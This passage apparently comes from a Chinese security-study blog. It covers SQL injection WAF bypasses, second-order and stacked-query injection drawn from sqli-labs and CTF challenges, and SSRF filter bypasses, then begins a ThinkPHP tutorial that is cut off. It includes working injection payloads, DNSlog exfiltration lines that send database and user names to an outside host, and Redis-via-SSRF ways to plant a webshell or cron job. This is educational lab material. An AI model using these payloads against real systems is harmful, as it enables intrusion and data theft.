<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select/**/*/**/from/**/yz;</span><br><span class="line"></span><br><span class="line">select%0a*%0afrom%0ayz; %0a 是回车</span><br><span class="line"></span><br><span class="line">select(a)from(yz);</span><br><span class="line"></span><br><span class="line">select(a)from(yz)where(a=1);</span><br></pre></td></tr></table></figure>

<h3 id="4-内联注释"><a href="#4-内联注释" class="headerlink" title="4 内联注释"></a>4 内联注释</h3><p>有些WAF的过滤关键词像&#x2F;union\sselect&#x2F;g，就比如上面说的，很多时候我都是采用内联注释。更复杂的例子需要更先进的方法。比如添加了SQL关键字，我们就要进一步分离这两个词来绕过这个过滤器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1/*!UnIoN*/SeLeCT</span><br><span class="line">/*!select*//*!**//*!from*//*!yz*/;</span><br></pre></td></tr></table></figure>

<h3 id="5-替换关键字"><a href="#5-替换关键字" class="headerlink" title="5 替换关键字"></a>5 替换关键字</h3><p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure>

<h3 id="6-URL编码"><a href="#6-URL编码" class="headerlink" title="6 URL编码"></a>6 URL编码</h3><p>有时后台界面会再次URL解码所以这时可以利用二次编码解决问题<br>后台语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$insert=$link-&gt;query(urldecode($_GET[&#x27;id&#x27;]));</span><br><span class="line"></span><br><span class="line">$row=$insert-&gt;fetch_row();</span><br><span class="line"></span><br><span class="line">select * from yz</span><br><span class="line"></span><br><span class="line">select * from  %2579%257a</span><br></pre></td></tr></table></figure>

<h3 id="7-十六进制绕过（引号绕过）"><a href="#7-十六进制绕过（引号绕过）" class="headerlink" title="7 十六进制绕过（引号绕过）"></a>7 十六进制绕过（引号绕过）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select a from yz where b=0x32;</span><br><span class="line"></span><br><span class="line">select * from yz where b=char(0x32);</span><br><span class="line"></span><br><span class="line">select * from yz where b=char(0x67)+char(0x75)+char(0x65)+char(0x73)+char(0x74)</span><br><span class="line"></span><br><span class="line">select column_name  from information_schema.tables where table_name=&quot;users&quot;</span><br><span class="line"></span><br><span class="line">select column_name  from information_schema.tables where table_name=0x7573657273</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;aaa&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;GO&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$str=$_GET[&#x27;aaa&#x27;];</span><br><span class="line"></span><br><span class="line">//$str = &quot;hello world&quot;; // 输入的字符串</span><br><span class="line">$hex = &quot;&quot;; // 用于存储转换后的16进制字符串</span><br><span class="line">for ($i = 0; $i &lt; strlen($str); $i++) &#123;</span><br><span class="line">    $hex .= &quot;CHAR(0X&quot; . dechex(ord($str[$i])) . &quot;)&quot;;</span><br><span class="line">    if ($i != strlen($str) - 1) &#123;</span><br><span class="line">        $hex .= &quot;+&quot;; // 每个字符之间使用+符号分隔</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $hex; // 输出转换后的16进制字符串</span><br></pre></td></tr></table></figure>









<h3 id="8-逗号绕过"><a href="#8-逗号绕过" class="headerlink" title="8 逗号绕过"></a>8 逗号绕过</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(),mid()</span><br><span class="line"></span><br><span class="line">mid(user() from 1 for 1)</span><br><span class="line"></span><br><span class="line">substr(user() from 1 for 1)</span><br><span class="line"></span><br><span class="line">select substr(user()from -1) from yz ;</span><br><span class="line"></span><br><span class="line">select ascii(substr(user() from 1 for 1)) &lt; 150;</span><br><span class="line"></span><br><span class="line">同时也可以利用替换函数</span><br><span class="line"></span><br><span class="line">select left(database(),2)&gt;&#x27;tf&#x27;;</span><br><span class="line"></span><br><span class="line">selete * from testtable limit 2,1;</span><br><span class="line"></span><br><span class="line">selete * from testtable limit 2 offset 1;</span><br></pre></td></tr></table></figure>

<h3 id="9-比较符-lt-gt-绕过"><a href="#9-比较符-lt-gt-绕过" class="headerlink" title="9 比较符(&lt;,&gt;)绕过"></a>9 比较符(&lt;,&gt;)绕过</h3><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。</p>
<p>如果无法使用比较操作符，那么就需要使用到greatest，strcmp来进行绕过了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GREATEST() 函数用于返回一组值中的最大值，它可以接受两个或多个参数，返回这些参数中的最大值。例如，GREATEST(1,2,3) 将返回 3。</span><br><span class="line"></span><br><span class="line">STRCMP() 函数用于比较两个字符串，它接受两个参数，并返回一个表示比较结果的整数值。如果第一个字符串小于第二个字符串，返回负数；如果第一个字符串大于第二个字符串，返回正数；如果两个字符串相等，则返回 0。例如，STRCMP(&#x27;abc&#x27;, &#x27;def&#x27;) 将返回一个负数，而 STRCMP(&#x27;abc&#x27;, &#x27;abc&#x27;) 将返回 0。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br><span class="line"></span><br><span class="line">select strcmp(left(database(),1),0x32);#lpad(&#x27;asd&#x27;,2,0)</span><br><span class="line"></span><br><span class="line">if(substr(id,1,1)in(0x41),1,3)</span><br><span class="line"></span><br><span class="line">-- 新学习了一种骚骚的注入姿势in、between、order by</span><br><span class="line">select * from yz where a in (&#x27;aaa&#x27;);</span><br><span class="line">select substr(a,1,1) in (&#x27;a&#x27;) from yz ;</span><br><span class="line"></span><br><span class="line">select * from yz where a between &#x27;a&#x27; and &#x27;b&#x27;;</span><br><span class="line">select * from yz where a between 0x89 and 0x90;</span><br><span class="line"></span><br><span class="line">select * from yz union select 1,2,3 order by 1;</span><br><span class="line">-- 也可以用like，根据排列顺序进行真值判断</span><br></pre></td></tr></table></figure>

<h3 id="10-注释符绕过"><a href="#10-注释符绕过" class="headerlink" title="10 注释符绕过"></a>10 注释符绕过</h3><p>在注入时的注释符一般为# –当两者不能用时就不能闭合引号<br>这里介绍一个奇淫巧技</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3 from yz where &#x27;1&#x27;/1=(1=1)/&#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">(1=1)中就有了判断位为下面的注入打下基础</span><br></pre></td></tr></table></figure>

<h3 id="11-宽字节绕过"><a href="#11-宽字节绕过" class="headerlink" title="11 宽字节绕过"></a>11 宽字节绕过</h3><p>字节注入也是在最近的项目中发现的问题，大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在%df\’ &#x3D;%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\’ &#x3D; %df%5c%27&#x3D;縗’，有了单引号就好注入了。</p>
<p>注：select防止用户自定义的名称和mysql保留字冲突</p>
<h3 id="12-with-rollup"><a href="#12-with-rollup" class="headerlink" title="12 with rollup"></a>12 with rollup</h3><p>一般结合group by使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1 as test from  yz group by test with rollup limit 1 offset 1;</span><br><span class="line"></span><br><span class="line">+------+</span><br><span class="line"></span><br><span class="line">| test |</span><br><span class="line"></span><br><span class="line">+------+</span><br><span class="line"></span><br><span class="line">| NULL |</span><br><span class="line"></span><br><span class="line">+------+</span><br></pre></td></tr></table></figure>

<h3 id="13-无列名注入"><a href="#13-无列名注入" class="headerlink" title="13 无列名注入"></a>13 无列名注入</h3><p>给未知列名起别名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select a from (select 1,2,3aunion select * from yz)v;</span><br></pre></td></tr></table></figure>

<h3 id="14-判断列数绕过"><a href="#14-判断列数绕过" class="headerlink" title="14 判断列数绕过"></a>14 判断列数绕过</h3><p>当order by 被过滤后就可以使用into 变量来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from yz limit 1,1 into @a,@b,@c;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>sql注入之复杂注入利用</title>
    <url>/2023/04/12/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A4%8D%E6%9D%82%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h2 id="复杂注入利用"><a href="#复杂注入利用" class="headerlink" title="复杂注入利用"></a>复杂注入利用</h2><pre><code>        - 二次注入 dnslog注入 绕过bypass等
</code></pre>
<p><a href="http://dnslog.cn/">http://dnslog.cn</a></p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="#二次注入"></a>#二次注入</h3><p>Less - 24 Second Degree Injections <em>Real treat</em> -Store Injections (二次注入)</p>
<p>$sql &#x3D; “UPDATE users SET PASSWORD&#x3D;’$pass’ where username&#x3D;’admin ‘</p>
<p>(pass_change.php)</p>
<p>![image-20230405150014162](D:\Documents\WeChat Files\wxid_ysgqrgnqemdo22\FileStorage\File\2023-04\0405md\0405.assets\image-20230405150014162.png)</p>
<p>![image-20230405161322984](D:\Documents\WeChat Files\wxid_ysgqrgnqemdo22\FileStorage\File\2023-04\0405md\0405.assets\image-20230405161322984.png)</p>
<p>网鼎杯2018Unfinish</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="#堆叠注入"></a>#堆叠注入</h3><p>Less-38 stacked Query</p>
<p>​		;update users set password&#x3D;’123456’ where username&#x3D;’Dumb’;</p>
<p>强网杯2019随便注</p>
<p><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://buuoj.cn/challenges</span><br><span class="line"></span><br><span class="line">根据数据库类型决定是否支持多条语句执行</span><br><span class="line"></span><br><span class="line">支持堆叠数据库类型：MYSQL MSSQL Postgresql等</span><br><span class="line"></span><br><span class="line">1&#x27; or 1=1#</span><br><span class="line"></span><br><span class="line">1&#x27; order by 1 *#* </span><br><span class="line"></span><br><span class="line">1&#x27; union select 1,2#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;;show databases;</span><br><span class="line"></span><br><span class="line">&#x27;;show tables;</span><br><span class="line"></span><br><span class="line">&#x27;;show columns from `1919810931114514`;		//words  1919810931114514</span><br><span class="line"></span><br><span class="line">&#x27;;select flag from `1919810931114514`;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;;SeT @a=0x73656c656374202a2066726f6d2060776f72647360;prepare mmm from @a;execute mmm;</span><br><span class="line"></span><br><span class="line">&#x27;;SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare mmm from @a;execute mmm;</span><br><span class="line"></span><br><span class="line">- prepare…from…是预处理语句，会进行编码转换。</span><br><span class="line">- execute用来执行由SQLPrepare创建的SQL语句。</span><br></pre></td></tr></table></figure>





<h3 id="DNS利用"><a href="#DNS利用" class="headerlink" title="#DNS利用"></a>#DNS利用</h3><h4 id="1-平台"><a href="#1-平台" class="headerlink" title="1.平台"></a>1.平台</h4><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p>
<p><a href="http://admin.dnslog.link/">http://admin.dnslog.link</a></p>
<p><a href="http://ceye.io/">http://ceye.io</a></p>
<p>![image-20221129113922708](D:\Documents\WeChat Files\wxid_ysgqrgnqemdo22\FileStorage\File\2023-04\0405md\0405.assets\image-20221129113922708.png)</p>
<h4 id="2-应用场景："><a href="#2-应用场景：" class="headerlink" title="2.应用场景："></a>2.应用场景：</h4><p>解决不回显，反向连接，SQL注入，命令执行，SSRF等</p>
<p>SQL注入：</p>
<p>select load_file(concat(‘\\‘,(select database()),’.4xxuwq.dnslog.cn\abc’));</p>
<p>and  (select load_file(concat(‘&#x2F;&#x2F;‘,(select database()),’.xxx.dnslog.cn&#x2F;abc’)))</p>
<h4 id="命令执行："><a href="#命令执行：" class="headerlink" title="命令执行："></a>命令执行：</h4><p>ping %USERNAME%.juwch5.dnslog.cn</p>
<p>*1： 如果web站点有waf 但可以找出真实ip，我们可以通过真实ip去访问站点，或许这时候我们所访问的真实ip就不存在waf了进而形成注入</p>
<p>*2： 我们也可以爬取整个web站点的接口，因为有可能开发人员在开发的时候，就对一个接口忘记添加waf了</p>
<p>*3：在实战中，可控的表名、列名、order by、sort、desc、limit参数后，不属于用户的输入，也能造成注入，这就是预编译不能完全防范sql注入的原因。</p>
<p><strong>常用手法</strong>：</p>
<p>单引号报错，双引号正常(对比返回长度)可能存在注入，然后判断数据库类型，套用各数据库语句函数，证明有注，之后可以放入sqlmap中跑出注入或者自己写脚本来跑</p>
]]></content>
  </entry>
  <entry>
    <title>ssrf漏洞</title>
    <url>/2023/04/21/ssrf%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="ssrf简介"><a href="#ssrf简介" class="headerlink" title="ssrf简介"></a>ssrf简介</h1><p>SSRF(Server-Side Request Forgery，服务器端请求伪造) 是一种由攻击者构造请求，由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统，因为服务器请求天然的可以穿越防火墙。漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作正确的过滤和限制。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档等等。SSRF漏洞通过篡改获取资源的请求发送给服务器（服务器并没有检测这个请求是否合法的），然后服务器以他的身份来访问服务器的其他资源。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p>
<p><strong>PHP中下面函数的使用不当会导致SSRF:</strong><br><strong>file_get_contents()</strong><br><strong>fsockopen()</strong><br><strong>curl_exec()<br>伪协议</strong></p>
<p>file:&#x2F;&#x2F;：从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>dict:&#x2F;&#x2F;：字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info<br>gopher:&#x2F;&#x2F;：分布式文档传递服务，可使用gopherus生成payload。</p>
<h2 id="挖掘SSRF漏洞"><a href="#挖掘SSRF漏洞" class="headerlink" title="挖掘SSRF漏洞"></a>挖掘SSRF漏洞</h2><p>能够对外发起网络请求的地方，就可能存在SSRF漏洞。</p>
<p>从远程服务器请求资源（Upload from URL,Import &amp;Export RSS feed)<br>数据库内置功能(Oracle[UTL_HTTP]、MongoDB、MSSQL、Postgres、CouchDB)<br>Webmail 收取其它邮箱邮件（POP3&#x2F;IMAP&#x2F;SMTP)<br>文件处理，编码处理，属性信息处理（ffpmg,ImageMaic，DOCX，PDF，XML处理器）</p>
<h2 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h2><p>利用条件：被攻击的服务等没有开启加密传输与鉴权。</p>
<p>端口扫描（扫描内网）<br>攻击内网存在漏洞的服务<br>攻击Web应用进行指纹识别及其中的漏洞<br>如果PHP安装了expect扩展，可以通过expect协议执行系统命令<br>dos攻击<br>file 协议暴力枚举敏感文件<br>Redis未授权漏洞的6种利用方法</p>
<p>保存文件到www目录，形成webshell<br>创建authorized_keys文件，利用ssh 私钥登录服务器<br>写计划任务(&#x2F;var&#x2F;spool&#x2F;cron&#x2F; &amp; &#x2F;etc&#x2F;cron.d&#x2F;)<br>slave of 8.8.8.8 主从模式利用<br>写入到&#x2F;etc&#x2F;profile.d&#x2F; 用户环境变量修改<br>开启AOF持久化纯文本记录 appendfilename</p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>正则绕过<br>配置域名<br>库绕过<br>dns重定向绕过<br>xip.io<br>CRLF 编码绕过</p>
<p>​	SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参</p>
<p>数进行过滤 一般的防御措施是对URL参数进行过滤，或者使得URL参数用户不可控，但当过滤方法不当时，就存在Bypass的不同方式.</p>
<h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="@绕过"></a><strong>@绕过</strong></h2><p><strong><code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code>请求是相同的</strong></p>
<p>该请求得到的内容都是10.10.10.10的内容，此绕过同样在URL跳转绕过中适用。</p>
<h2 id="点分割符号替换"><a href="#点分割符号替换" class="headerlink" title="点分割符号替换"></a><strong>点分割符号替换</strong></h2><p>在浏览器中可以使用不同的分割符号来代替域名中的<code>.</code>分割，可以使用<code>。</code>、<code>｡</code>、<code>．</code>来代替：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www。qq。com</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//www｡qq｡com</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//www．qq．com</span></span><br></pre></td></tr></table></figure>



<h2 id="本地回环地址"><a href="#本地回环地址" class="headerlink" title="本地回环地址"></a><strong>本地回环地址</strong></h2><p>127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加<code>[]</code>)：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//127.0.0.1 </span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//localhost </span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//127.255.255.254 </span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> - <span class="number">127.255</span><span class="number">.255</span><span class="number">.254</span> </span><br><span class="line"><span class="attr">http</span>:<span class="comment">//[::1] </span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//[::ffff:7f00:1] </span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//[::ffff:127.0.0.1] </span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//127.1 </span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//127.0.1 </span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//0:80</span></span><br></pre></td></tr></table></figure>

<h2 id="IP的进制转换"><a href="#IP的进制转换" class="headerlink" title="IP的进制转换"></a>IP的进制转换</h2><p>​			IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。 IPFuscator (<a href="https://github.com/helcaraxeals/IPFuscator">https://github.com/helcaraxeals/IPFuscator</a>) 工具可实现IP地址的进制转换，包括了八进制、十进制、十六进制、混合进制。在这个工具的基础上添加了IPV6的转换和版本输出的优化。</p>
<p>在脚本对IP进行八进制转换时，一些情况下会在字符串末尾多加一个L。</p>
<h2 id="封闭式字母数字-Enclosed-Alphanumerics-字符"><a href="#封闭式字母数字-Enclosed-Alphanumerics-字符" class="headerlink" title="封闭式字母数字 (Enclosed Alphanumerics)字符"></a>封闭式字母数字 (Enclosed Alphanumerics)字符</h2><p>封闭式字母数字是一个由字母数字组成的Unicode印刷符号块，使用这些符号块替换域名中的字母也可以被浏览器接受。在浏览器测试中只有下列单圆圈的字符可用：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">List</span>:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>

<p>浏览器访问时会自动识别成拉丁英文字符：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.<span class="property">com</span></span><br></pre></td></tr></table></figure>

<h2 id="URL十六进制编码"><a href="#URL十六进制编码" class="headerlink" title="URL十六进制编码"></a><strong>URL十六进制编码</strong></h2><p>URL十六进制编码可被浏览器正常识别，编码脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#-*- coding:utf-8 -*- </span><br><span class="line">data = &quot;www.qq.com&quot;; </span><br><span class="line">alist = [] </span><br><span class="line">for x in data: </span><br><span class="line">    for i in range(0, len(x), 2): </span><br><span class="line">        alist.append((x[i:i+2]).encode(&#x27;hex&#x27;)) </span><br><span class="line">print &quot;http://%&quot;+&#x27;%&#x27;.join(alist)</span><br></pre></td></tr></table></figure>

<h2 id="利用网址缩短"><a href="#利用网址缩短" class="headerlink" title="利用网址缩短"></a><strong>利用网址缩短</strong></h2><p>网上有很多将网址转换未短网址的网站。</p>
<p><strong>•<a href="https://www.985.so/%E2%80%A2https://www.urlc.cn/">https://www.985.so/•https://www.urlc.cn/</a></strong></p>
<h2 id="xip-io"><a href="#xip-io" class="headerlink" title="xip.io"></a><strong>xip.io</strong></h2><p>xip.io是一个开源泛域名服务。它会把如下的域名解析到特定的地址，其实和dns解析绕过一个道理。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//10.0.0.1.xip.io = 10.0.0.1</span></span><br><span class="line">www<span class="number">.10</span><span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>.<span class="property">xip</span>.<span class="property">io</span>= <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//mysite.10.0.0.1.xip.io = 10.0.0.1</span></span><br><span class="line">foo.<span class="property">http</span>:<span class="comment">//bar.10.0.0.1.xip.io = 10.0.0.1</span></span><br></pre></td></tr></table></figure>

<p><strong>防御</strong></p>
<p>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。</p>
<p>限制不能访问内网的IP，以防止对内网进行攻击</p>
<p>屏蔽返回的详细信息</p>
]]></content>
  </entry>
  <entry>
    <title>tp框架</title>
    <url>/2023/04/21/thinkphp/</url>
    <content><![CDATA[<p>ThinkPHP框架</p>
<p>一、框架概述</p>
<h2 id="1、什么是框架"><a href="#1、什么是框架" class="headerlink" title="1、什么是框架"></a>1、什么是框架</h2><p>框架就是一些代码类、方法（函数）、变量、常量的集合，这些代码是功能结构性的代码（并非业务代码）。业务代码其实就是具体的一些模块的增删改查逻辑代码。</p>
<p>使用框架开发项目，有便于代码重用、开发效率高、代码规范好、便于功能扩展等优点。</p>
<h2 id="2、php中的主流框架"><a href="#2、php中的主流框架" class="headerlink" title="2、php中的主流框架"></a>2、php中的主流框架</h2><p>①Zend Framework 框架，PHP官方框架。</p>
<p>②YII框架，又叫易框架。</p>
<p>③Symfony 框架。</p>
<p>④Laravel框架，市场使用较多。</p>
<p>⑤Codelgniter框架，简称CI框架。</p>
<p>⑥ThinkPHP框架，简称TP框架，常用版本：3.2.3和 5.0.*版本。</p>
<p>ThinkPHP是国人自己开发的框架。有中文官网、中文帮助文档、中文社区，以及丰富的百度搜索资源。所以ThinkPHP很适合作为入门级的开发框架。</p>
<p>这些框架大多都基于MVC设计思想和面向对象的。</p>
<p><strong>mvc：</strong></p>
<p>M:模型model，处理业务数据，与数据库做交互。</p>
<p>V:视图view，显示html页面，用户能够看到并与之交互的页面。</p>
<p>C：控制器controller，接收请求，调用模型处理数据，调用视图显示页面。</p>
<p>整个网站应用，分为模型、视图、控制器三大部分组成。</p>
<h1 id="二、ThinkPHP框架安装"><a href="#二、ThinkPHP框架安装" class="headerlink" title="二、ThinkPHP框架安装"></a>二、ThinkPHP框架安装</h1><h2 id="1、下载并解压框架"><a href="#1、下载并解压框架" class="headerlink" title="1、下载并解压框架"></a><strong>1、下载并解压框架</strong></h2><p>下载地址：<a href="http://www.thinkphp.cn/down.html">http://www.thinkphp.cn</a></p>
<p>下载后解压到工作目录</p>
<h2 id="2、配置虚拟主机"><a href="#2、配置虚拟主机" class="headerlink" title="2、配置虚拟主机"></a>2、配置虚拟主机</h2><p>①通过phpStudy的“站点域名管理”进行配置或者直接修改apache的虚拟主机配置文件，</p>
<p>将站点域名指向项目目录下的public目录</p>
<p>②域名解析，修改hosts文件</p>
<p>增加域名如下： 多个域名可以写在同一行，以空格隔开</p>
<p>127.0.0.1       tpshop.com <a href="http://www.tpshop.com/">www.tpshop.com</a></p>
<p>③重启apache，在浏览器访问配置的虚拟站点<a href="http://www.tpshop.com/">http://www.tpshop.com</a></p>
<p>看到以上界面，说明框架安装成功。</p>
<p>apache配置参考（不要照搬）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    DocumentRoot &quot;E:\phpStudy\WWW\tpshop\public&quot;</span><br><span class="line">    ServerName www.tpshop.com</span><br><span class="line">    ServerAlias tpshop.com</span><br><span class="line">  	&lt;Directory &quot;E:\phpStudy\WWW\tpshop\public&quot;&gt;</span><br><span class="line">      	Options FollowSymLinks ExecCGI</span><br><span class="line">        AllowOverride All</span><br><span class="line">        Order allow,deny</span><br><span class="line">        Allow from all</span><br><span class="line">        Require all granted</span><br><span class="line">  	&lt;/Directory&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>



<h1 id="三、TP框架基础"><a href="#三、TP框架基础" class="headerlink" title="三、TP框架基础"></a>三、TP框架基础</h1><h2 id="1、目录结构（重点）"><a href="#1、目录结构（重点）" class="headerlink" title="1、目录结构（重点）"></a>1、目录结构（重点）</h2><p>（见手册–基础–目录结构）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 1.project  应用部署目录</span><br><span class="line"> 2.├─application           应用目录（可设置）</span><br><span class="line"> 3.│  ├─common             公共模块目录（可更改）</span><br><span class="line"> 4.│  ├─index              模块目录(可更改)</span><br><span class="line"> 5.│  │  ├─config.php      模块配置文件</span><br><span class="line"> 6.│  │  ├─common.php      模块函数文件</span><br><span class="line"> 7.│  │  ├─controller      控制器目录</span><br><span class="line"> 8.│  │  ├─model           模型目录</span><br><span class="line"> 9.│  │  ├─view            视图目录</span><br><span class="line">10.│  │  └─ ...            更多类库目录</span><br><span class="line">11.│  ├─command.php        命令行工具配置文件</span><br><span class="line">12.│  ├─common.php         应用公共（函数）文件</span><br><span class="line">13.│  ├─config.php         应用（公共）配置文件</span><br><span class="line">14.│  ├─database.php       数据库配置文件</span><br><span class="line">15.│  ├─tags.php           应用行为扩展定义文件</span><br><span class="line">16.│  └─route.php          路由配置文件</span><br><span class="line">17.├─extend                扩展类库目录（可定义）</span><br><span class="line">18.├─public                WEB 部署目录（对外访问目录）</span><br><span class="line">19.│  ├─static             静态资源存放目录(css,js,image)</span><br><span class="line">20.│  ├─index.php          应用入口文件</span><br><span class="line">21.│  ├─router.php         快速测试文件</span><br><span class="line">22.│  └─.htaccess          用于 apache 的重写</span><br><span class="line">23.├─runtime               应用的运行时目录（可写，可设置）</span><br><span class="line">24.├─vendor                第三方类库目录（Composer）</span><br><span class="line">25.├─thinkphp              框架系统目录</span><br><span class="line">26.│  ├─lang               语言包目录</span><br><span class="line">27.│  ├─library            框架核心类库目录</span><br><span class="line">28.│  │  ├─think           Think 类库包目录</span><br><span class="line">29.│  │  └─traits          系统 Traits 目录</span><br><span class="line">30.│  ├─tpl                系统模板目录</span><br><span class="line">31.│  ├─.htaccess          用于 apache 的重写</span><br><span class="line">32.│  ├─.travis.yml        CI 定义文件</span><br><span class="line">33.│  ├─base.php           基础定义文件</span><br><span class="line">34.│  ├─composer.json      composer 